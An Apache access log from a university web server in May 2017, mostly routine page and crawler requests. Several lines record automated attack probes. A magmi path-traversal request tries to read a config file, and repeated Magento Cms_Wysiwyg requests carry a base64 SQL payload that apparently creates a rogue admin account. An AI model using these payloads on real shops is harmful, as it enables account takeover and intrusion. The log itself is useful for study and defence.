94.70.48.156 - - [21/May/2017:13:02:28 +0200] "GET /dottorato/templates/phd_template/images/sheet_h.png HTTP/1.1" 200 189 "http://www.ce.uniroma2.it/dottorato/templates/phd_template/css/template.css" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:02:29 +0200] "GET /dottorato/templates/phd_template/images/sheet_v.png HTTP/1.1" 200 187 "http://www.ce.uniroma2.it/dottorato/templates/phd_template/css/template.css" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:02:29 +0200] "GET /dottorato/templates/phd_template/images/header.png HTTP/1.1" 200 38358 "http://www.ce.uniroma2.it/dottorato/templates/phd_template/css/template.css" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:02:29 +0200] "GET /favicon.ico HTTP/1.1" 200 318 "http://www.ce.uniroma2.it/dottorato/index.php?option=com_content&view=article&id=134&Itemid=113" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
64.71.171.78 - - [21/May/2017:13:02:46 +0200] "GET /courses/sdcc1617/template/css/style.css HTTP/1.1" 200 737 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; ms-office; MSOffice 16)"
64.71.171.78 - - [21/May/2017:13:02:48 +0200] "GET /courses/sdcc1617/template/css/bootstrap.css HTTP/1.1" 200 21157 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; ms-office; MSOffice 16)"
64.71.171.78 - - [21/May/2017:13:02:49 +0200] "GET /courses/sdcc1617/template/css/style.css HTTP/1.1" 200 737 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; ms-office; MSOffice 16)"
64.71.171.78 - - [21/May/2017:13:02:54 +0200] "GET /courses/sdcc1617/template/css/bootstrap.css HTTP/1.1" 200 21157 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; ms-office; MSOffice 16)"
94.70.48.156 - - [21/May/2017:13:03:01 +0200] "GET /dottorato/ HTTP/1.1" 200 2734 "http://dottorati.uniroma2.it/index.php/corsi" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:03:18 +0200] "GET /dottorato/index.php?option=com_content&view=article&id=136 HTTP/1.1" 200 3616 "http://www.ce.uniroma2.it/dottorato/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:03:46 +0200] "GET /dottorato/index.php?option=com_content&view=article&id=133&Itemid=111 HTTP/1.1" 200 2905 "http://www.ce.uniroma2.it/dottorato/index.php?option=com_content&view=article&id=136" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:03:58 +0200] "GET /dottorato/index.php?view=article&id=137&option=com_content HTTP/1.1" 200 2799 "http://www.ce.uniroma2.it/dottorato/index.php?option=com_content&view=article&id=136" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
87.7.187.81 - - [21/May/2017:13:04:28 +0200] "GET /courses/sdcc1617/ HTTP/1.1" 200 17254 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:06:01 +0200] "GET /dottorato/index.php?option=com_content&view=article&id=134&Itemid=113 HTTP/1.1" 200 2998 "http://www.ce.uniroma2.it/dottorato/index.php?option=com_content&view=article&id=134&Itemid=113" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
64.71.171.78 - - [21/May/2017:13:06:49 +0200] "GET /courses/sdcc1617/template/css/style.css HTTP/1.1" 200 737 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; ms-office; MSOffice 16)"
64.71.171.78 - - [21/May/2017:13:06:51 +0200] "GET /courses/sdcc1617/template/css/bootstrap.css HTTP/1.1" 200 21157 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; ms-office; MSOffice 16)"
64.71.171.78 - - [21/May/2017:13:06:52 +0200] "GET /courses/sdcc1617/template/css/style.css HTTP/1.1" 200 737 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; ms-office; MSOffice 16)"
64.71.171.78 - - [21/May/2017:13:06:53 +0200] "GET /courses/sdcc1617/template/css/bootstrap.css HTTP/1.1" 200 21157 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; ms-office; MSOffice 16)"
64.71.171.78 - - [21/May/2017:13:07:20 +0200] "GET /courses/sdcc1617/template/css/style.css HTTP/1.1" 200 737 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; ms-office; MSOffice 16)"
64.71.171.78 - - [21/May/2017:13:07:21 +0200] "GET /courses/sdcc1617/template/css/bootstrap.css HTTP/1.1" 200 21157 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; ms-office; MSOffice 16)"
64.71.171.78 - - [21/May/2017:13:07:22 +0200] "GET /courses/sdcc1617/template/css/style.css HTTP/1.1" 200 737 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; ms-office; MSOffice 16)"
64.71.171.78 - - [21/May/2017:13:07:23 +0200] "GET /courses/sdcc1617/template/css/bootstrap.css HTTP/1.1" 200 21157 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; ms-office; MSOffice 16)"
104.154.49.2 - - [21/May/2017:13:07:34 +0200] "GET /asbda2017/?feed=rss2 HTTP/1.1" 200 3487 "-" "Java/1.8.0_121"
180.76.15.31 - - [21/May/2017:13:07:43 +0200] "GET /~nardelli/ HTTP/1.1" 304 - "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
82.55.105.169 - - [21/May/2017:13:07:57 +0200] "GET /~lopresti/Didattica/Arch_Calc/Arch_Calc0607/Assemblatore.pdf HTTP/1.1" 200 133330 "https://www.google.it/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
82.55.105.169 - - [21/May/2017:13:07:57 +0200] "GET /favicon.ico HTTP/1.1" 200 318 "http://www.ce.uniroma2.it/~lopresti/Didattica/Arch_Calc/Arch_Calc0607/Assemblatore.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
87.7.187.81 - - [21/May/2017:13:07:58 +0200] "GET /courses/sdcc1617/ HTTP/1.1" 200 17254 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
35.154.201.162 - - [21/May/2017:13:08:23 +0200] "GET /app/etc/local.xml HTTP/1.1" 404 299 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)"
35.154.201.162 - - [21/May/2017:13:08:24 +0200] "GET //magmi/web/download_file.php?file=../conf/magmi.ini HTTP/1.1" 404 309 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)"
35.154.201.162 - - [21/May/2017:13:08:24 +0200] "GET //web/download_file.php?file=../conf/magmi.ini HTTP/1.1" 404 303 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)"
35.154.201.162 - - [21/May/2017:13:08:25 +0200] "GET /admin/Cms_Wysiwyg/directive/?forwarded=true&isIframe=true&___directive=e3tibG9jayB0eXBlPSJhZG1pbmh0bWwvcmVwb3J0X3NlYXJjaF9ncmlkIn19&filter=bnVtX3Jlc3VsdHNbZnJvbV09MCZudW1fcmVzdWx0c1tmaWVsZF9leHByXT0xPTIpO0RFTEVURSBGUk9NIGBhZG1pbl91c2VyYCBXSEVSRSB1c2VyX2lkID0gMzM7ICBERUxFVEUgRlJPTSBgYWRtaW5fcm9sZWAgV0hFUkUgdXNlcl9pZCA9IDMzOyAgSU5TRVJUIElOVE8gYGFkbWluX3VzZXJgIChgdXNlcl9pZGAsIGBmaXJzdG5hbWVgLCBgbGFzdG5hbWVgLCBgZW1haWxgLCBgdXNlcm5hbWVgLCBgcGFzc3dvcmRgLCBgY3JlYXRlZGAsIGBtb2RpZmllZGAsIGBsb2dkYXRlYCwgYGxvZ251bWAsIGByZWxvYWRfYWNsX2ZsYWdgLCBgaXNfYWN0aXZlYCwgYGV4dHJhYCkgVkFMVUVTICAoMzMsJ21hZ2VudG8nLCAnZGVzaWduJywgJ2Rlc2lnbkBtYWdlbnRvY29tbWVyY2UuY29tJywgJ2Rlc2lnbicsICdkODkyYTkyNWExZjdkYTdlMGJhMWE5ODU5OTA1ODczYjpycCcsICdudWxsJywgJ251bGwnLCAnbnVsbCcsIDEsIDAsIDEsICdOOycpOyAgSU5TRVJUIElOVE8gYGFkbWluX3JvbGVgIChgcGFyZW50X2lkYCwgYHRyZWVfbGV2ZWxgLCBgc29ydF9vcmRlcmAsIGByb2xlX3R5cGVgLCBgdXNlcl9pZGAsIGByb2xlX25hbWVgKSBWQUxVRVMgKDEsIDIsIDAsICdVJywgMzMsICdkZXNpZ24nKTs7IC0tIA== HTTP/1.1" 404 310 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)"
35.154.201.162 - - [21/May/2017:13:08:25 +0200] "GET /admin/Cms_Wysiwyg/directive/?forwarded=true&isIframe=true&___directive=e3tibG9jayB0eXBlPSJhZG1pbmh0bWwvcmVwb3J0X3NlYXJjaF9ncmlkIn19&filter=bnVtX3Jlc3VsdHNbZnJvbV09MCZudW1fcmVzdWx0c1tmaWVsZF9leHByXT0xPTIpO0RFTEVURSBGUk9NIGBhZG1pbl91c2VyYCBXSEVSRSB1c2VyX2lkID0gMzM7ICBERUxFVEUgRlJPTSBgYWRtaW5fcm9sZWAgV0hFUkUgdXNlcl9pZCA9IDMzOyAgSU5TRVJUIElOVE8gYGFkbWluX3VzZXJgIChgdXNlcl9pZGAsIGBmaXJzdG5hbWVgLCBgbGFzdG5hbWVgLCBgZW1haWxgLCBgdXNlcm5hbWVgLCBgcGFzc3dvcmRgLCBgY3JlYXRlZGAsIGBtb2RpZmllZGAsIGBsb2dkYXRlYCwgYGxvZ251bWAsIGByZWxvYWRfYWNsX2ZsYWdgLCBgaXNfYWN0aXZlYCwgYGV4dHJhYCkgVkFMVUVTICAoMzMsJ21hZ2VudG8nLCAnZGVzaWduJywgJ2Rlc2lnbkBtYWdlbnRvY29tbWVyY2UuY29tJywgJ2Rlc2lnbicsICdkODkyYTkyNWExZjdkYTdlMGJhMWE5ODU5OTA1ODczYjpycCcsICdudWxsJywgJ251bGwnLCAnbnVsbCcsIDEsIDAsIDEsICdOOycpOyAgSU5TRVJUIElOVE8gYGFkbWluX3JvbGVgIChgcGFyZW50X2lkYCwgYHRyZWVfbGV2ZWxgLCBgc29ydF9vcmRlcmAsIGByb2xlX3R5cGVgLCBgdXNlcl9pZGAsIGByb2xlX25hbWVgKSBWQUxVRVMgKDEsIDIsIDAsICdVJywgMzMsICdkZXNpZ24nKTs7IC0tIA== HTTP/1.1" 404 310 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)"
35.154.201.162 - - [21/May/2017:13:08:26 +0200] "GET /admin/Cms_Wysiwyg/directive/?forwarded=true&isIframe=true&___directive=e3tibG9jayB0eXBlPSJhZG1pbmh0bWwvcmVwb3J0X3NlYXJjaF9ncmlkIn19&filter=bnVtX3Jlc3VsdHNbZnJvbV09MCZudW1fcmVzdWx0c1tmaWVsZF9leHByXT0xPTIpO0RFTEVURSBGUk9NIGBhZG1pbl91c2VyYCBXSEVSRSB1c2VyX2lkID0gMzM7ICBERUxFVEUgRlJPTSBgYWRtaW5fcm9sZWAgV0hFUkUgdXNlcl9pZCA9IDMzOyAgSU5TRVJUIElOVE8gYGFkbWluX3VzZXJgIChgdXNlcl9pZGAsIGBmaXJzdG5hbWVgLCBgbGFzdG5hbWVgLCBgZW1haWxgLCBgdXNlcm5hbWVgLCBgcGFzc3dvcmRgLCBgY3JlYXRlZGAsIGBtb2RpZmllZGAsIGBsb2dkYXRlYCwgYGxvZ251bWAsIGByZWxvYWRfYWNsX2ZsYWdgLCBgaXNfYWN0aXZlYCwgYGV4dHJhYCkgVkFMVUVTICAoMzMsJ21hZ2VudG8nLCAnZGVzaWduJywgJ2Rlc2lnbkBtYWdlbnRvY29tbWVyY2UuY29tJywgJ2Rlc2lnbicsICdkODkyYTkyNWExZjdkYTdlMGJhMWE5ODU5OTA1ODczYjpycCcsICdudWxsJywgJ251bGwnLCAnbnVsbCcsIDEsIDAsIDEsICdOOycpOyAgSU5TRVJUIElOVE8gYGFkbWluX3JvbGVgIChgcGFyZW50X2lkYCwgYHRyZWVfbGV2ZWxgLCBgc29ydF9vcmRlcmAsIGByb2xlX3R5cGVgLCBgdXNlcl9pZGAsIGByb2xlX25hbWVgKSBWQUxVRVMgKDEsIDIsIDAsICdVJywgMzMsICdkZXNpZ24nKTs7IC0tIA== HTTP/1.1" 404 310 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)"
35.154.201.162 - - [21/May/2017:13:08:27 +0200] "GET /admin/Cms_Wysiwyg/directive/?forwarded=true&isIframe=true&___directive=e3tibG9jayB0eXBlPSJhZG1pbmh0bWwvcmVwb3J0X3NlYXJjaF9ncmlkIn19&filter=bnVtX3Jlc3VsdHNbZnJvbV09MCZudW1fcmVzdWx0c1tmaWVsZF9leHByXT0xPTIpO0RFTEVURSBGUk9NIGBhZG1pbl91c2VyYCBXSEVSRSB1c2VyX2lkID0gMzM7ICBERUxFVEUgRlJPTSBgYWRtaW5fcm9sZWAgV0hFUkUgdXNlcl9pZCA9IDMzOyAgSU5TRVJUIElOVE8gYGFkbWluX3VzZXJgIChgdXNlcl9pZGAsIGBmaXJzdG5hbWVgLCBgbGFzdG5hbWVgLCBgZW1haWxgLCBgdXNlcm5hbWVgLCBgcGFzc3dvcmRgLCBgY3JlYXRlZGAsIGBtb2RpZmllZGAsIGBsb2dkYXRlYCwgYGxvZ251bWAsIGByZWxvYWRfYWNsX2ZsYWdgLCBgaXNfYWN0aXZlYCwgYGV4dHJhYCkgVkFMVUVTICAoMzMsJ21hZ2VudG8nLCAnZGVzaWduJywgJ2Rlc2lnbkBtYWdlbnRvY29tbWVyY2UuY29tJywgJ2Rlc2lnbicsICdkODkyYTkyNWExZjdkYTdlMGJhMWE5ODU5OTA1ODczYjpycCcsICdudWxsJywgJ251bGwnLCAnbnVsbCcsIDEsIDAsIDEsICdOOycpOyAgSU5TRVJUIElOVE8gYGFkbWluX3JvbGVgIChgcGFyZW50X2lkYCwgYHRyZWVfbGV2ZWxgLCBgc29ydF9vcmRlcmAsIGByb2xlX3R5cGVgLCBgdXNlcl9pZGAsIGByb2xlX25hbWVgKSBWQUxVRVMgKDEsIDIsIDAsICdVJywgMzMsICdkZXNpZ24nKTs7IC0tIA== HTTP/1.1" 404 310 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)"
35.154.201.162 - - [21/May/2017:13:08:27 +0200] "GET /downloader/ HTTP/1.1" 404 293 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)"
35.154.201.162 - - [21/May/2017:13:08:28 +0200] "GET /api/xmlrpc HTTP/1.1" 404 292 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)"
35.154.201.162 - - [21/May/2017:13:08:28 +0200] "GET /~lopresti/Didattica/RetiWeb/app/etc/local.xml HTTP/1.1" 404 327 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)"
35.154.201.162 - - [21/May/2017:13:08:29 +0200] "GET /~lopresti/Didattica/RetiWeb//magmi/web/download_file.php?file=../conf/magmi.ini HTTP/1.1" 404 338 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)"
35.154.201.162 - - [21/May/2017:13:08:29 +0200] "GET /~lopresti/Didattica/RetiWeb//web/download_file.php?file=../conf/magmi.ini HTTP/1.1" 404 332 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)"
35.154.201.162 - - [21/May/2017:13:08:30 +0200] "GET /~lopresti/Didattica/RetiWeb/admin/Cms_Wysiwyg/directive/?forwarded=true&isIframe=true&___directive=e3tibG9jayB0eXBlPSJhZG1pbmh0bWwvcmVwb3J0X3NlYXJjaF9ncmlkIn19&filter=bnVtX3Jlc3VsdHNbZnJvbV09MCZudW1fcmVzdWx0c1tmaWVsZF9leHByXT0xPTIpO0RFTEVURSBGUk9NIGBhZG1pbl91c2VyYCBXSEVSRSB1c2VyX2lkID0gMzM7ICBERUxFVEUgRlJPTSBgYWRtaW5fcm9sZWAgV0hFUkUgdXNlcl9pZCA9IDMzOyAgSU5TRVJUIElOVE8gYGFkbWluX3VzZXJgIChgdXNlcl9pZGAsIGBmaXJzdG5hbWVgLCBgbGFzdG5hbWVgLCBgZW1haWxgLCBgdXNlcm5hbWVgLCBgcGFzc3dvcmRgLCBgY3JlYXRlZGAsIGBtb2RpZmllZGAsIGBsb2dkYXRlYCwgYGxvZ251bWAsIGByZWxvYWRfYWNsX2ZsYWdgLCBgaXNfYWN0aXZlYCwgYGV4dHJhYCkgVkFMVUVTICAoMzMsJ21hZ2VudG8nLCAnZGVzaWduJywgJ2Rlc2lnbkBtYWdlbnRvY29tbWVyY2UuY29tJywgJ2Rlc2lnbicsICdkODkyYTkyNWExZjdkYTdlMGJhMWE5ODU5OTA1ODczYjpycCcsICdudWxsJywgJ251bGwnLCAnbnVsbCcsIDEsIDAsIDEsICdOOycpOyAgSU5TRVJUIElOVE8gYGFkbWluX3JvbGVgIChgcGFyZW50X2lkYCwgYHRyZWVfbGV2ZWxgLCBgc29ydF9vcmRlcmAsIGByb2xlX3R5cGVgLCBgdXNlcl9pZGAsIGByb2xlX25hbWVgKSBWQUxVRVMgKDEsIDIsIDAsICdVJywgMzMsICdkZXNpZ24nKTs7IC0tIA== HTTP/1.1" 404 338 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)"
35.154.201.162 - - [21/May/2017:13:08:30 +0200] "GET /~lopresti/Didattica/RetiWeb/admin/Cms_Wysiwyg/directive/?forwarded=true&isIframe=true&___directive=e3tibG9jayB0eXBlPSJhZG1pbmh0bWwvcmVwb3J0X3NlYXJjaF9ncmlkIn19&filter=bnVtX3Jlc3VsdHNbZnJvbV09MCZudW1fcmVzdWx0c1tmaWVsZF9leHByXT0xPTIpO0RFTEVURSBGUk9NIGBhZG1pbl91c2VyYCBXSEVSRSB1c2VyX2lkID0gMzM7ICBERUxFVEUgRlJPTSBgYWRtaW5fcm9sZWAgV0hFUkUgdXNlcl9pZCA9IDMzOyAgSU5TRVJUIElOVE8gYGFkbWluX3VzZXJgIChgdXNlcl9pZGAsIGBmaXJzdG5hbWVgLCBgbGFzdG5hbWVgLCBgZW1haWxgLCBgdXNlcm5hbWVgLCBgcGFzc3dvcmRgLCBgY3JlYXRlZGAsIGBtb2RpZmllZGAsIGBsb2dkYXRlYCwgYGxvZ251bWAsIGByZWxvYWRfYWNsX2ZsYWdgLCBgaXNfYWN0aXZlYCwgYGV4dHJhYCkgVkFMVUVTICAoMzMsJ21hZ2VudG8nLCAnZGVzaWduJywgJ2Rlc2lnbkBtYWdlbnRvY29tbWVyY2UuY29tJywgJ2Rlc2lnbicsICdkODkyYTkyNWExZjdkYTdlMGJhMWE5ODU5OTA1ODczYjpycCcsICdudWxsJywgJ251bGwnLCAnbnVsbCcsIDEsIDAsIDEsICdOOycpOyAgSU5TRVJUIElOVE8gYGFkbWluX3JvbGVgIChgcGFyZW50X2lkYCwgYHRyZWVfbGV2ZWxgLCBgc29ydF9vcmRlcmAsIGByb2xlX3R5cGVgLCBgdXNlcl9pZGAsIGByb2xlX25hbWVgKSBWQUxVRVMgKDEsIDIsIDAsICdVJywgMzMsICdkZXNpZ24nKTs7IC0tIA== HTTP/1.1" 404 338 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)"
35.154.201.162 - - [21/May/2017:13:08:31 +0200] "GET /~lopresti/Didattica/RetiWeb/admin/Cms_Wysiwyg/directive/?forwarded=true&isIframe=true&___directive=e3tibG9jayB0eXBlPSJhZG1pbmh0bWwvcmVwb3J0X3NlYXJjaF9ncmlkIn19&filter=bnVtX3Jlc3VsdHNbZnJvbV09MCZudW1fcmVzdWx0c1tmaWVsZF9leHByXT0xPTIpO0RFTEVURSBGUk9NIGBhZG1pbl91c2VyYCBXSEVSRSB1c2VyX2lkID0gMzM7ICBERUxFVEUgRlJPTSBgYWRtaW5fcm9sZWAgV0hFUkUgdXNlcl9pZCA9IDMzOyAgSU5TRVJUIElOVE8gYGFkbWluX3VzZXJgIChgdXNlcl9pZGAsIGBmaXJzdG5hbWVgLCBgbGFzdG5hbWVgLCBgZW1haWxgLCBgdXNlcm5hbWVgLCBgcGFzc3dvcmRgLCBgY3JlYXRlZGAsIGBtb2RpZmllZGAsIGBsb2dkYXRlYCwgYGxvZ251bWAsIGByZWxvYWRfYWNsX2ZsYWdgLCBgaXNfYWN0aXZlYCwgYGV4dHJhYCkgVkFMVUVTICAoMzMsJ21hZ2VudG8nLCAnZGVzaWduJywgJ2Rlc2lnbkBtYWdlbnRvY29tbWVyY2UuY29tJywgJ2Rlc2lnbicsICdkODkyYTkyNWExZjdkYTdlMGJhMWE5ODU5OTA1ODczYjpycCcsICdudWxsJywgJ251bGwnLCAnbnVsbCcsIDEsIDAsIDEsICdOOycpOyAgSU5TRVJUIElOVE8gYGFkbWluX3JvbGVgIChgcGFyZW50X2lkYCwgYHRyZWVfbGV2ZWxgLCBgc29ydF9vcmRlcmAsIGByb2xlX3R5cGVgLCBgdXNlcl9pZGAsIGByb2xlX25hbWVgKSBWQUxVRVMgKDEsIDIsIDAsICdVJywgMzMsICdkZXNpZ24nKTs7IC0tIA== HTTP/1.1" 404 338 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)"
35.154.201.162 - - [21/May/2017:13:08:32 +0200] "GET /~lopresti/Didattica/RetiWeb/admin/Cms_Wysiwyg/directive/?forwarded=true&isIframe=true&___directive=e3tibG9jayB0eXBlPSJhZG1pbmh0bWwvcmVwb3J0X3NlYXJjaF9ncmlkIn19&filter=bnVtX3Jlc3VsdHNbZnJvbV09MCZudW1fcmVzdWx0c1tmaWVsZF9leHByXT0xPTIpO0RFTEVURSBGUk9NIGBhZG1pbl91c2VyYCBXSEVSRSB1c2VyX2lkID0gMzM7ICBERUxFVEUgRlJPTSBgYWRtaW5fcm9sZWAgV0hFUkUgdXNlcl9pZCA9IDMzOyAgSU5TRVJUIElOVE8gYGFkbWluX3VzZXJgIChgdXNlcl9pZGAsIGBmaXJzdG5hbWVgLCBgbGFzdG5hbWVgLCBgZW1haWxgLCBgdXNlcm5hbWVgLCBgcGFzc3dvcmRgLCBgY3JlYXRlZGAsIGBtb2RpZmllZGAsIGBsb2dkYXRlYCwgYGxvZ251bWAsIGByZWxvYWRfYWNsX2ZsYWdgLCBgaXNfYWN0aXZlYCwgYGV4dHJhYCkgVkFMVUVTICAoMzMsJ21hZ2VudG8nLCAnZGVzaWduJywgJ2Rlc2lnbkBtYWdlbnRvY29tbWVyY2UuY29tJywgJ2Rlc2lnbicsICdkODkyYTkyNWExZjdkYTdlMGJhMWE5ODU5OTA1ODczYjpycCcsICdudWxsJywgJ251bGwnLCAnbnVsbCcsIDEsIDAsIDEsICdOOycpOyAgSU5TRVJUIElOVE8gYGFkbWluX3JvbGVgIChgcGFyZW50X2lkYCwgYHRyZWVfbGV2ZWxgLCBgc29ydF9vcmRlcmAsIGByb2xlX3R5cGVgLCBgdXNlcl9pZGAsIGByb2xlX25hbWVgKSBWQUxVRVMgKDEsIDIsIDAsICdVJywgMzMsICdkZXNpZ24nKTs7IC0tIA== HTTP/1.1" 404 338 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)"
35.154.201.162 - - [21/May/2017:13:08:32 +0200] "GET /~lopresti/Didattica/RetiWeb/downloader/ HTTP/1.1" 404 321 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)"
35.154.201.162 - - [21/May/2017:13:08:33 +0200] "GET /~lopresti/Didattica/RetiWeb/api/xmlrpc HTTP/1.1" 404 320 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)"
104.197.197.203 - - [21/May/2017:13:08:32 +0200] "GET /acpross2017/?feed=rss2 HTTP/1.1" 200 3664 "-" "Java/1.8.0_121"
178.137.83.79 - - [21/May/2017:13:08:59 +0200] "GET /robots.txt HTTP/1.1" 200 61 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
178.137.83.79 - - [21/May/2017:13:08:59 +0200] "GET / HTTP/1.1" 200 5735 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
178.137.83.79 - - [21/May/2017:13:08:59 +0200] "GET /xmlrpc.php?rsd HTTP/1.1" 404 292 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
178.137.83.79 - - [21/May/2017:13:08:59 +0200] "GET /blog/robots.txt HTTP/1.1" 404 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
178.137.83.79 - - [21/May/2017:13:08:59 +0200] "GET /blog/ HTTP/1.1" 404 287 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
178.137.83.79 - - [21/May/2017:13:08:59 +0200] "GET /wordpress/ HTTP/1.1" 404 292 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
178.137.83.79 - - [21/May/2017:13:08:59 +0200] "GET /wp/ HTTP/1.1" 404 285 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
66.249.75.63 - - [21/May/2017:13:11:06 +0200] "GET /psblas/UserGuide-3.0/node49.html HTTP/1.1" 200 2229 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
87.7.187.81 - - [21/May/2017:13:11:29 +0200] "GET /courses/sdcc1617/ HTTP/1.1" 200 17254 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
112.26.78.185 - - [21/May/2017:13:11:47 +0200] "HEAD /js/fckeditor/editor/ HTTP/1.1" 404 - "-" "compatible;Baiduspider/2.0; +http://www.baidu.com/search/spider.html"
